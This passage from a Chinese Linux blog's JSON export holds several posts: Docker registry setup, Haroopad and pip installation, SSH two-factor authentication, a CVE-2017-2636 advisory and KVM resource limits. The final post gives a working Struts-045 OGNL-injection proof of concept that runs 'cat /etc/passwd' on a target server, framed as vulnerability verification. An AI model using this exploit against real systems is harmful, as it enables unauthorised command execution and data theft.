1.11 MBubuntu latest 4ca3a192ff2a 3 months ago 128.2 MBcentos latest 0584b3d2cf6d 4 months ago 196.5 MBregistry latest c9bd19d022f6 5 months ago 33.27 MB[I] $ sudo ip add |grep 192 inet 192.168.66.3/24 brd 192.168.66.255 scope global enp0s25 inet 192.168.66.4/24 brd 192.168.66.255 scope global wlp3s0 从私有镜像仓库中拉取的镜像启动容器 12345678[I] $ sudo ip add |grep 192 inet 192.168.66.3/24 brd 192.168.66.255 scope global enp0s25 inet 192.168.66.4/24 brd 192.168.66.255 scope global wlp3s0[I] $ docker run -i -t 10.82.2.103:5000/busybox/ # hostname &amp;&amp;hostid4ed4430a0b8d11ac0200/ # 可以看到可以正常启动容器 至此，私有镜像仓库部署完成。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"},{"name":"Docker私有仓库","slug":"技术文档/Tools/容器/Docker私有仓库","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/Docker私有仓库/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器私有仓库配置","slug":"容器私有仓库配置","permalink":"http://blog.unixmen.cn/tags/容器私有仓库配置/"},{"name":"Docker私有仓库","slug":"Docker私有仓库","permalink":"http://blog.unixmen.cn/tags/Docker私有仓库/"}]},{"title":"Fedora安装Haroopad","slug":"Fedora安装Haroopad","date":"2017-05-02T08:59:14.000Z","updated":"2017-05-02T10:08:43.000Z","comments":true,"path":"2017/05/02/Fedora安装Haroopad/","link":"","permalink":"http://blog.unixmen.cn/2017/05/02/Fedora安装Haroopad/","excerpt":"","text":"简介Haroopad是一款跨平台的Markdown编辑器，在windows下，可下载安装包，通过安装想到进行安装。在Ubuntu/Mac OS下可载官方打包好的deb软件，通过包命令可以安装。然而在其他Linux系列版本下并没有对应的软件包，所以需要下载源码包进行安装；值得一提的是，Haroopad在所有平台下都区分32/64位版本。 介绍安装环境我的Fedora版本是23，Haroopad版本是0.13.1 64位（这也是截至今天最新的稳定版本）。 下载源码安装包：官方下载地址为： 1https://bitbucket.org/rhiokim/haroopad-download/downloads/haroopad-v0.13.1-x64.tar.gz 安装 将下载的软件包解压： 1tar -zxvf haroopad-v0.13.1-x64.tar.gz 再将解压出来的软件包解压： 1tar -zxvf data.tar.gz 将解压出来的文件复制到根目录 1cp -rv ./usr / 将另一个软件包也解压出来 1tar -zxvf control.tar.gz 将从control.tar.gz 中解压出来的文件添加可行权限 1chmod 755 postinst 运行postinst 1./postinst 创建“.desktop” 文件使用以下命令创建“.desktop” 文件 12345678910111213cat &gt;/usr/share/applications/Haroopad.desktop&lt;&lt;EOF[Desktop Entry]Name=haroopadVersion=0.13.1Exec=haroopadComment=The Next Document processor based on MarkdownIcon=haroopadType=ApplicationTerminal=falseStartupNotify=trueEncoding=UTF-8Categories=Development;GTK;GNOME;EOF 复制Hroopad 图标文件：1cp -rf usr/share/icons/hicolor/ /usr/share/icons/hicolor 至此Hroopad安装完成。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"Haroopad","slug":"技术文档/Tools/Haroopad","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/Haroopad/"}],"tags":[{"name":"Haroopad","slug":"Haroopad","permalink":"http://blog.unixmen.cn/tags/Haroopad/"},{"name":"标记语言","slug":"标记语言","permalink":"http://blog.unixmen.cn/tags/标记语言/"}]},{"title":"如何在Fedora中安装pip2或pip3","slug":"如何在Fedora中安装pip2或pip3","date":"2017-05-02T03:24:19.000Z","updated":"2017-05-02T10:11:04.000Z","comments":true,"path":"2017/05/02/如何在Fedora中安装pip2或pip3/","link":"","permalink":"http://blog.unixmen.cn/2017/05/02/如何在Fedora中安装pip2或pip3/","excerpt":"","text":"文章简介pip 是一个简单易用的python包管理工具。本文简要介绍pip2及pip3 的两种安装方式，当然pip2和pip3在同一套系统中pip3 跟pyhon一样，2版本和3版本是可以并存的。 安装pip 首先我们清空我们系统中残留冗余包。 1dnf clean all 作为最佳体验，我们升级系统软件包 1dnf update -y 现在可以安装pip工具包了pip2使用以下命令进行安装：1dnf -y install python-pip 也可以通过以下方式进行安装1python -m pip install -U pip pip3使用以下命令进行安装：1dnf -y install python3-pip 也可以通过以下方式进行安装1python3 -m pip install -U pip 验证：pip安装完成后，我们可以进行验证是否正确了安装成功，具体操作如下： 首先可以获取帮助文档 如果仅仅pip2或着pip3可以通过以下命令进行验证： 1pip --help 假如系统中同时安装了pip2和pip3 就要制定pip命令版本进行验证： 如查看pip3的帮助文档： 1pip3 --help 查看pip3的帮助文档 1pip2 --help 其次还可以获取版本信息： pip2 1pip2 -V pip3 1pip3 -V 你pip -V 命令将获取类似如下结果： 1pip 9.0.1 from /usr/lib/python2.7/site-packages (python 2.7)","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"Python","slug":"技术文档/Tools/Python","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/Python/"},{"name":"pip","slug":"技术文档/Tools/Python/pip","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/Python/pip/"}],"tags":[{"name":"pip","slug":"pip","permalink":"http://blog.unixmen.cn/tags/pip/"},{"name":"python","slug":"python","permalink":"http://blog.unixmen.cn/tags/python/"}]},{"title":"SSH安全加固篇-通过运维密码实现Linux系统SSH双因子认证","slug":"通过运维密码实现Linux系统SSH双因子认证","date":"2017-03-29T00:38:24.000Z","updated":"2017-03-29T03:21:56.000Z","comments":true,"path":"2017/03/29/通过运维密码实现Linux系统SSH双因子认证/","link":"","permalink":"http://blog.unixmen.cn/2017/03/29/通过运维密码实现Linux系统SSH双因子认证/","excerpt":"","text":"通过运维密码实现Linux系统SSH双因子认证关于本文本文讲述了如果通过Linux.中国提供的微信小程序”运维密码”结合 Google身份验证器”Google Authenticator“实现Linux系统OpenSSH双因子认证对SSH进行安全加固。 前言/背景近来很多知名企业都出现了密码泄露，业内对多重认证的呼声也越来越高。 双因子认证 什么是双因子认证 双因子认证（Two-factor authentication，也叫2FA），是一种通过组合两种不同的验证方式进行用户身份验证的机制。 在这种多重认证的系统中，用户需要通过两种不同的认证程序： 提供他们知道的信息（如 用户名/密码） 再借助其他工具提供用户所不知道的信息（如用手机生成的一次性密码） SSH双因子认证实现思路使用“运维密码”结合“Google身份验证器”及Linux系统“OpenSSH”双因子认证对SSH进行安全加固。 关于Google 身份验证器 为了鼓励广泛采用双因子认证的方式，Google 公司发布了 Google 身份验证器Google Authenticator，一款开源的，可基于开放规则（如 HMAP/ 基于时间）生成一次性密码的软件。这是一款跨平台软件，可运行在 Linux、 Android、 iOS。Google 公司同时也支持插件式鉴别模块PAM （pluggable authentication module），使其能和其他也适用 PAM 进行验证的工具（如 OpenSSH）协同工作。 关于运维密码 Linux.中国社区长期接触互联网新技术的最前沿，洞察大势所趋，身兼新技术广泛传播及维护互联网安全的重任，以及方便运维及新技术的传播开发了运维密码小程序。 如何开始首先我们需要一些准备工作： 一台运行着 OpenSSH 服务版本大于6.2的 Linux 主机 一台能运行微信的智能手机 一台支持SSH登陆的终端 在 Linux 系统中安装 Google 身份验证器第一步需要在运行着 OpenSSH 服务的 Linux 主机上安装 Google 身份验证器。按照如下步骤安装 Google 身份验证器及其PAM模块。 用安装包安装 Google 身份验证器如果你不想自己构建 Google 身份验证器，在几个 Linux 发行版上有已经编译好的安装包。安装包里面包含 Google 身份验证器 二进制程序和 PAM 模块。 在 Ubuntu 上安装 Google 身份验证器： 12sudo apt-get install libpam-google-authenticator 在 Fedora 上安装 Google 身份验证器： 12sudo dnf install google-authenticator 在 CentOS 上安装 Google 身份验证器： 在 CentOS 上安装 Google 身份验证器 ，需要首先启用 EPEL 软件库，然后运行如下命令： 12sudo yum install google-authenticator 编译安装 Google 身份验证器首先，安装构建 Google 身份验证器所需的软件包。 在 Debian、 Ubuntu 或 Linux Mint 上： 12sudo apt-get install wget make gcc libpam0g-dev 在 CentOS、 Fedora 或 RHEL上： 12sudo yum install wget make gcc pam-devel 然后下载 Google 身份验证器的源代码 12git clone https://github.com/google/google-authenticator.git 编译安装Google 身份验证器： 12345678cd google-authenticator/libpam./bootstrap.sh./configuremake 如果构建成功，你会在目录中看到 pam_google_authenticator.so 和 google-authenticator 两个文件。 最后，将 Google 身份验证器安装到合适位置。默认会安装到 /usr/local/lib/security 下，根据你的系统不同，你可能需要将其符号链接到 pam 库的位置（比如 CentOS 7 会在 /usr/lib64/security）。如下图所示： 12sudo make install 至此，Google 身份验证器安装完成。 配置Google 身份验证器及运维密码完成Google 身份验证器的安装我们仅仅完成了第一步，接着需要对Google 身份验证器、运维密码、SSH进行配置才能达到我们预期的效果。 配置google-authenticator及生成验证密钥 使用（以下）命令生成验证密钥 12google-authenticator 生成验证密钥的时候，会再次确认信息。 12Do you want authentication tokens to be time-based (y/n) 意思是：你想要生产基于时间生成验证码吗？这里需要需要输入y 输入y之后你将看到一个二维码，它使用如下二维码图形格式表示我们数字形态的密钥。注：一会我们要用到它在运维密码上完成配置。 紧急验证码在生成密钥的同时还生成了5个8位的紧急密码，当然，也是一次性使用的，请妥善保存，以备不时之需。 保存Google Authenticator配置文件 Google Authenticator 虽然运行了，但是相关设置还没有保存，接下来会提示保存： 意思是：你想将配置文件写入到“/root/.google_authenticator”保存吗？ 12Do you want me to update your &quot;/root/.google_authenticator&quot; file? (y/n) 输入y回车 禁止同一令牌多用途登陆 意思是：你是否要禁用同一密钥多用途登陆，这将限制你每30秒只能登陆一次，这将增加接收提醒的机会，甚至能够防止中间人攻击。 123456 Do you want to disallow multiple uses of the same authenticationtoken? This restricts you to one login about every 30s, but it increasesyour chances to notice or even prevent man-in-the-middle attacks (y/n) 输入y回车 时间容错设置 意思是:默认情况下，密钥在30秒内有效，为了防止由于客户端与服务器时间偏移（时间相差太大）导致认证失败，google authenticator设计时间容错措施。 1234567891011121314 By default, tokens are good for 30 seconds. In order to compensate forpossible time-skew between the client and the server, we allow an extratoken before and after the current time. If you experience problems withpoor time synchronization, you can increase the window from its defaultsize of +-1min (window size of 3) to about +-4min (window size of17 acceptable tokens).Do you want to do so? (y/n) 这个可根据实际情况进行配置。 暴力破解防护 意思是：在你的电脑存在暴力破解的情况下可开启身份认证次数限制模块，默认限制为：30秒内不超过三次登陆尝试。 12345678 If the computer that you are logging into isn&apos;t hardened against brute-forcelogin attempts, you can enable rate-limiting for the authentication module.By default, this limits attackers to no more than 3 login attempts every 30s.Do you want to enable rate-limiting (y/n) 输入y回车 配置完成 配置完成后会在home目录下生成一个权限为400的隐藏文件，如下图所示： 配置运维密码 打开微信小程序 打开微信，依次点击发现，小程序 输入“运维密码”并搜索 点击“运维密码”进入应用 点击右下角二维码图标 扫一扫配置google-authenticator时所生成的二维码 点击确定添加场景 添加完成 配置SSH服务 添加认证模块 在/etc/pam.d/sshd文件添加认证模块 12echo &quot;auth required pam_google_authenticator.so&quot; &gt;&gt;/etc/pam.d/sshd 配置任何的密码认证 12sed -i &apos;s/ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/g&apos; /etc/ssh/sshd_config 重启sshd服务 12systemctl restart sshd.service 测试登陆以上配置完成基本上就搞定了，下面我们进行测试。 登陆测试 输入命令登陆主机 12ssh root@10.112.2.3 首先输入服务器的密码,接着会让输入运维密码。 运维密码可在小程序中查看。 如下图： 我们可以看到，在登陆的时候，需要配合“运维密码”才能登陆服务器。 公钥登陆测试 如果使用公钥登陆呢？以上配置是不是也是需要配合运维密码才能登陆的，我们进行验证： 首先，我们将本机的公钥复制到远程机器的authorized_keys文件中。 12ssh-copy-id root@10.112.2.3 登陆测试 我们可以看到，不需要输入任何密码，直接登陆到了系统。 结合运维密码配置增强型SSH安全选项针对上面公钥登陆的测试，如果还任我不是很安全，我们可以设定如下登陆场景：公钥+密码+运维密码，我们需要如何做呢？ 配置SSH公钥双因子 修改/etc/ssh/sshd_config配置文件 12echo &quot;AuthenticationMethods publickey,keyboard-interactive:pam&quot; &gt;&gt;/etc/ssh/sshd_config 重启SSH服务 12systemctl restart sshd.service 登陆测试 12ssh root@10.112.2.3 可以看到，登陆的时候是需要验证公钥，密码，及输入运维密码才能登陆到系统。 没有密钥的情况下尝试登陆测试,如下图 至此，本文结束，如有错误及不足欢迎指正。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"安全","slug":"技术文档/Tools/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/安全/"}],"tags":[{"name":"双因子认证","slug":"双因子认证","permalink":"http://blog.unixmen.cn/tags/双因子认证/"},{"name":"SSH安全加固","slug":"SSH安全加固","permalink":"http://blog.unixmen.cn/tags/SSH安全加固/"},{"name":"运维密码","slug":"运维密码","permalink":"http://blog.unixmen.cn/tags/运维密码/"}]},{"title":"潜伏7年的Linux内核漏洞CVE-2017-2636 ,可本地提权","slug":"潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权","date":"2017-03-20T02:00:55.000Z","updated":"2017-03-20T02:55:33.000Z","comments":true,"path":"2017/03/20/潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权/","link":"","permalink":"http://blog.unixmen.cn/2017/03/20/潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权/","excerpt":"","text":"漏洞描述又一个古老的Linux内核漏洞被曝光！ 漏洞编号：CVE-2017-2636漏洞发现者：Alexander Popov漏洞危害：高危，(CVSS v3标准漏洞,评分为7.8), 低权限用户利用该漏洞可以在Linux系统上实现本地提权。影响范围：这个bug最早引入在2009年6月22号。在该日期发布后的内核版本均可能受该漏洞影响。详情请参看https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=be10eb7589337e5defbe214dae038a53dd21add8 漏洞简述：该漏洞是Linux内核驱动 n_hdlc 模块(drivers/tty/n_hdlc.c)发生条件竞争导致的，。 Positive Technologies的研究员Alexander Popov发现了存在于N_HLDC linux内核驱动的竞争条件问题。这个内核驱动负责处理高级数据链路控制（High-Level Data Link Control或简称HDLC）数据。问题导致了double-free漏洞。利用该漏洞可以进行权限提升。该驱动模块提供HDLC串行线路规则，在大多Linux发行版的内核配置为CONFIG_N_HDLC = m，n_hdlc被编译成模块并启用。 Double Free其实就是同一个指针free两次。虽然一般把它叫做double free，其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞。 “这是CVE-2017-2636的声明，该漏洞即N_HLDC (drivers/tty/n_hdlc.c) linux内核驱动中的竞争条件。这个漏洞可以用来进行本地提权。”SecList的安全公告提到。“该驱动提供HDLC串行线路规程，这是很多linux发行版中的内核模块——只要是内核设置中有CONFIG_N_HDLC=m的linux发行版。要利用这个漏洞不需要Microgate或者SyncLink硬件。当没有权限的用户打开伪终端并且调用TIOCSETD ioctl函数设置HDLC串行线路规程的时候，模块就会自动加载。” 因此未经授权的攻击者可以利用这个漏洞注入执行任意代码。 影响范围 这个漏洞影响的范围涵盖大多数主流的Linux发行版，包括Red Hat Enterprise Linux 6, 7, Fedora, SUSE, Debian和Ubuntu。 由于漏洞可以追溯至2009年7月，那些Linux设备存在漏洞长达7年了，但是根据Positive Technologies的调查，很难确定漏洞是否已经被利用过。 “漏洞非常老，所以在Linux工作站和服务器中传播广泛。”Popov说道，“要想利用漏洞，攻击者只需要没有权限的普通用户就行了。另外，攻击不需要任何特殊的硬件。” 研究人员在用syzkaller fuzzer进行系统调用测试的时候发现了这个漏洞。syzkaller fuzzer是由Google开发的代码安全审计软件。 Popov于是在2017年2月28日将漏洞细节、exp原型和补丁上报给了kernel.org。Popov称会在之后公布PoC。 修复建议 该漏洞目前已经修复，更新和漏洞详情均在3月7日公布。建议用户尽快下载安全更新。如果暂时无法安装更新，建议手动关闭n_hdlc模块。 Linux各发行版本对于该漏洞相关信息Red Hat Enterprise Linux/CentOShttps://access.redhat.com/security/cve/CVE-2017-2636 Debianhttps://security-tracker.debian.org/tracker/CVE-2017-2636 ubuntuhttps://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-2636.html SUSE/openSUSEhttps://www.suse.com/security/cve/CVE-2017-2636.html","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"http://blog.unixmen.cn/tags/struts2/"}]},{"title":"KVM 实例资源限制","slug":"KVM实例资源限制","date":"2017-03-08T10:32:46.000Z","updated":"2017-03-08T10:35:56.000Z","comments":true,"path":"2017/03/08/KVM实例资源限制/","link":"","permalink":"http://blog.unixmen.cn/2017/03/08/KVM实例资源限制/","excerpt":"","text":"KVM生产环境一般情况下都是对KVM环境及内核等进行优化从而达到KVM实例发挥最优性能，但某些特定场景也会对实例进行资源限制。以下分享如何控制实例的资源使用，对实例使用资源进行控制。 一、磁盘资源的控制对磁盘的资源限制可使用blkiotune来实现。 使用blkiotune对磁盘进行限制有两种方式： 设置实例的权重 限制磁盘的IOPS 命令行格式：1blkiotune &lt;domain&gt; [--weight &lt;number&gt;] [--device-weights &lt;string&gt;] [--device-read-iops-sec &lt;string&gt;] [--device-write-iops-sec &lt;string&gt;] [--device-read-bytes-sec &lt;string&gt;] [--device-write-bytes-sec &lt;string&gt;] [--config] [--live] [--current] 参数如下：123456789--total-bytes-sec &lt;number&gt; total throughput limit in bytes per second--read-bytes-sec &lt;number&gt; read throughput limit in bytes per second--write-bytes-sec &lt;number&gt; write throughput limit in bytes per second--total-iops-sec &lt;number&gt; total I/O operations limit per second--read-iops-sec &lt;number&gt; read I/O operations limit per second--write-iops-sec &lt;number&gt; write I/O operations limit per second--config affect next boot--live affect running domain--current affect current domain 设置磁盘的权重磁盘的权重数值范围在100-1000。 示例：设置虚拟机的权重为700，并立即生效。1virsh blkiotune 25 --weight 700 --live 实例xml配置为：123&lt;blkiotune&gt;&lt;weight&gt;700&lt;/weight&gt;&lt;/blkiotune&gt; 限制磁盘IOPS使用blkdeviotune限制读写速度和IOPS 示例：限制读写（吞吐量）及IOPS1virsh blkdeviotune netb2c vda --read-bytes-sec 4096 --write-bytes-sec 2048 --read-iops-sec 15 --write-iops-sec 15 --live 实例xml配置为： 123456&lt;iotune&gt; &lt;read_bytes_sec&gt;4096&lt;/read_bytes_sec&gt; &lt;write_bytes_sec&gt;2048&lt;/write_bytes_sec&gt; &lt;read_iops_sec&gt;15&lt;/read_iops_sec&gt; &lt;write_iops_sec&gt;15&lt;/write_iops_sec&gt;&lt;/iotune&gt; 实测结果读写总和（读写速度、IOPS）与读写（读写速度、IOPS）同时只能设置一个 列举guest块设备列表 12virsh domblklist wpftestvda /home1/wpf/ubuntu-14-04-test.qcow2 设定guest读/写IOPS 1virsh blkdeviotune wpftest vda --read-iops-sec 300 --write-iops-sec 300 获取当前IOPS限制 1234567virsh blkdeviotune wpftest vdatotal_bytes_sec: 0read_bytes_sec : 0write_bytes_sec: 0total_iops_sec : 0read_iops_sec : 300write_iops_sec : 300 二、网卡的资源控制网卡的资源限制可在添加网卡是进行限制，以及对已有的网卡进行限制两种资源限制效果上没有区别，可按需选择。 添加网卡时对网卡带宽进行限制命令行格式为：1attach-interface &lt;domain&gt; &lt;type&gt; &lt;source&gt; [&lt;target&gt;] [&lt;mac&gt;] [&lt;script&gt;] [&lt;model&gt;] [--persistent] [&lt;inbound&gt;] [&lt;outbound&gt;] 命令行参数：12345678910[--domain] &lt;string&gt; domain name, id or uuid[--type] &lt;string&gt; network interface type[--source] &lt;string&gt; source of network interface[--target] &lt;string&gt; target network name[--mac] &lt;string&gt; MAC address[--script] &lt;string&gt; script used to bridge network interface[--model] &lt;string&gt; model type--persistent persist interface attachment[--inbound] &lt;string&gt; control domain&apos;s incoming traffics[--outbound] &lt;string&gt; control domain&apos;s outgoing traffics 对已有网卡进行带宽限制 命令格式为： 1domiftune &lt;domain&gt; &lt;interface&gt; [--inbound &lt;string&gt;] [--outbound &lt;string&gt;] [--config] [--live] [--current] 参数为： 1234567[--domain] &lt;string&gt; domain name, id or uuid[--interface] &lt;string&gt; interface device (MAC Address)--inbound &lt;string&gt; control domain&apos;s incoming traffics--outbound &lt;string&gt; control domain&apos;s outgoing traffics--config affect next boot--live affect running domain--current affect current domain 实例xml配置为 1234&lt;bandwidth&gt;&lt;inbound average=&apos;1000&apos; peak=&apos;50&apos; burst=&apos;64&apos;/&gt;&lt;outbound average=&apos;1000&apos; peak=&apos;50&apos; burst=&apos;64&apos;/&gt;&lt;/bandwidth&gt; 注：单位kilobytes 实测结果Libvirt实际也是使用TC，因为TC只能限制流出方向流量，不能限制流入方向，所以通过Libvirt限制流量，实际也只能限制流出方向。 列举guest网卡列表： 1234virsh domiflist netb2cInterface Type Source Model MAC-------------------------------------------------------vnet44 network default rtl8139 52:54:00:4a:61:6a 设定带宽限制 1virsh domiftune wpftest 52:54:00:3b:e2:a5 --inbound 1000 --outbound 1000 --live 查看当前网卡带宽限制 1234567virsh domiftune netb2c vnet44inbound.average: 1000inbound.peak : 0inbound.burst : 0outbound.average: 1000outbound.peak : 0outbound.burst : 0 注：资源限制过程中，–interface可以是MAC地址也可以是设备名字，生产环境最好使用MAC地址进行限制。 三、CPU资源的控制对于CPU的资源控制可对实例CPU的权重进行调整，优化可对vcpu与cpu物理核心进行绑定已提升性能及减少宿主机的CPU压力。 命令行格式：1schedinfo &lt;domain&gt; [--weight &lt;number&gt;] [--cap &lt;number&gt;] [--current] [--config] [--live] [[--set] &lt;string&gt;].. 参数：1234567[--domain] &lt;string&gt; domain name, id or uuid--weight &lt;number&gt; weight for XEN_CREDIT--cap &lt;number&gt; cap for XEN_CREDIT--current get/set current scheduler info--config get/set value to be used on next boot--live get/set value from running domain[--set] &lt;string&gt; parameter=value 实例xml配置为1234567891011121314&lt;domain&gt;&lt;cputune&gt;&lt;vcpupin vcpu=&quot;0&quot; cpuset=&quot;1-4,^2&quot;/&gt;&lt;vcpupin vcpu=&quot;1&quot; cpuset=&quot;0,1&quot;/&gt;&lt;vcpupin vcpu=&quot;2&quot; cpuset=&quot;2,3&quot;/&gt;&lt;vcpupin vcpu=&quot;3&quot; cpuset=&quot;0,4&quot;/&gt;&lt;emulatorpin cpuset=&quot;1-3&quot;/&gt;&lt;shares&gt;2048&lt;/shares&gt;&lt;period&gt;1000000&lt;/period&gt;&lt;quota&gt;-1&lt;/quota&gt;&lt;emulator_period&gt;1000000&lt;/emulator_period&gt;&lt;emulator_quota&gt;-1&lt;/emulator_quota&gt;&lt;/cputune&gt;&lt;/domain&gt; 主要参数说明：shares cpu权重，没有固定的数值，和其他的虚拟机相比较，那个的数值大，那个可以使用的cpu资源就多，比如设置2048值得虚拟机，就比设置1024数值的虚拟机可以多使用2倍的cpu资源。period vcpu强制间隔的时间周期，单位微秒，范围[1000, 1000000]，每一个vcpu不能使用超过period时间周期。quota vcpu最大允许带宽，单位微秒，范围[1000, 18446744073709551]emulator_period 强制间隔的时间周期，单位微妙，范围[1000, 1000000]，虚拟机进程(qemu)不能使用超过period时间周期。emulator_quota 虚拟机进程(qemu)最大允许带宽，单位微妙，范围[1000, 18446744073709551]。 实测结果对vcpu绑定有性能提升的效果，设置权重能控制CPU的资源利用。123virsh schedinfo --set cpu_shares=500 netb2cScheduler : posixcpu_shares : 500 四、内存资源的控制使用memtune可对实例使用内存资源进行控制 命令行格式为： 1memtune &lt;domain&gt; [--hard-limit &lt;number&gt;] [--soft-limit &lt;number&gt;] [--swap-hard-limit &lt;number&gt;] [--min-guarantee &lt;number&gt;] [--config] [--live] [--current] 命令行参数： 12345678[--domain] &lt;string&gt; domain name, id or uuid--hard-limit &lt;number&gt; Max memory, as scaled integer (default KiB)--soft-limit &lt;number&gt; Memory during contention, as scaled integer (default KiB)--swap-hard-limit &lt;number&gt; Max memory plus swap, as scaled integer (default KiB)--min-guarantee &lt;number&gt; Min guaranteed memory, as scaled integer (default KiB)--config affect next boot--live affect running domain--current affect current domain 实例xml配置为 12345678&lt;memory unit=&apos;KiB&apos;&gt;2097152&lt;/memory&gt;&lt;currentMemory unit=&apos;KiB&apos;&gt;2097152&lt;/currentMemory&gt;&lt;memtune&gt;&lt;hard_limit unit=&apos;KiB&apos;&gt;4194304&lt;/hard_limit&gt;&lt;soft_limit unit=&apos;KiB&apos;&gt;8388608&lt;/soft_limit&gt;&lt;min_guarantee unit=&apos;Kib&apos;&gt;1024000&lt;/min_guarantee&gt;&gt;&lt;swap_hard_limit unit=&apos;KiB&apos;&gt;4194304&lt;/swap_hard_limit&gt;&lt;/memtune&gt; 实测结果内存可以限制住，但一旦实例内存超限，会导致实例内存溢出从而宕机。 示例： 1virsh memtune netb2c --hard-limit 4194304 --soft-limit 8388608 --swap-hard-limit 4194304 --live --config 查看限制结果 1234virsh memtune netb2chard_limit : 4194304soft_limit : 8388608swap_hard_limit: 4194304","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"虚拟化","slug":"技术文档/Tools/虚拟化","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/虚拟化/"},{"name":"KVM","slug":"技术文档/Tools/虚拟化/KVM","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/虚拟化/KVM/"}],"tags":[{"name":"KVM","slug":"KVM","permalink":"http://blog.unixmen.cn/tags/KVM/"},{"name":"资源限制","slug":"资源限制","permalink":"http://blog.unixmen.cn/tags/资源限制/"},{"name":"性能优化","slug":"性能优化","permalink":"http://blog.unixmen.cn/tags/性能优化/"}]},{"title":"Struts-045 漏洞验证","slug":"Struts-045-漏洞验证","date":"2017-03-07T08:20:18.000Z","updated":"2017-03-08T01:18:35.000Z","comments":true,"path":"2017/03/07/Struts-045-漏洞验证/","link":"","permalink":"http://blog.unixmen.cn/2017/03/07/Struts-045-漏洞验证/","excerpt":"","text":"Struts-045-漏洞验证及漏洞修复后测试 接上篇注：本脚本仅为Struts-045漏洞验证及研究，严谨从事任何非法恶意操作。 一、脚本信息1234567891011121314151617181920#! /usr/bin/env python# encoding:utf-8import urllib2import sysfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openersdef poc(): register_openers() datagen, header = multipart_encode(&#123;&quot;image1&quot;: open(&quot;tmp.txt&quot;, &quot;rb&quot;)&#125;) header[&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot; header[&quot;Content-Type&quot;]=&quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;cat /etc/passwd&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot; request = urllib2.Request(str(sys.argv[1]),datagen,headers=header) response = urllib2.urlopen(request) print response.read()poc() 二、使用帮助 将脚本命名为st-045.py 在工作目录创建 image1 和 tmp.txt两个空文件 执行 python st-045.py URL如下图所示：三、漏洞修复后","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"http://blog.unixmen.cn/tags/struts2/"}]},{"title":"关于Apache 